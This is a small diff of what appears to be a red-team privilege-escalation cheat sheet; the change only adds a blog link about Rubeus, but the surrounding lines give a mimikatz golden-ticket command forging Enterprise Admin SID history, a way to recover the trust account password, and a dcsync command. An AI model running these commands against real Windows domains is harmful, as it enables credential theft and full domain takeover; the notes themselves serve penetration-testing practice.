@@ -176,7 +176,8 @@ PrivEsc
       https://adsecurity.org/?p=1640
       mimikatz kerberos::golden </admin:Administrator|/user:DC_compname$> /domain:domain.fqdn /sid:current_domain_sid /sids:parent_domain_Sid..-519 /krbtgt:krbtgt_hash /startoffset:0 /endin:600 /renewmax:10080 /ptt
     Trust Tickets
-      https://adsecurity.org/?p=1588
+        https://adsecurity.org/?p=1588
+        https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/
       GET Trusts Hash
       hashdump and look for account ending in $ which is not a computer account. This is the trust password. (Changes every 30 days)
       dcsync current_domain_fqdn current_dom\target_domain$ (example: dcsync admin.offshore.com admin\client$)
